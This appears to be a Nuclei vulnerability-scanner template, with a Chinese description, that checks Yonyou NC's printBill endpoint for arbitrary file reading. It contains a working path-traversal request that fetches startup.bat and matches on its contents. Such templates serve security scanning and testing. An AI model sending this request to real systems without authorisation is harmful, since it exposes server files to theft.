id: yongyouOA-CRM-printBill-file-read

info:
  name: 用友NC系统printBill接口存在任意文件读取漏洞
  author: cnaq  
  severity: high 
  description: 用友NC系统printBill接口存在任意文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC%E7%B3%BB%E7%BB%9FprintBill%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: yongyou,file

requests:
  - raw:
      - |
        GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 68

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - '@echo off'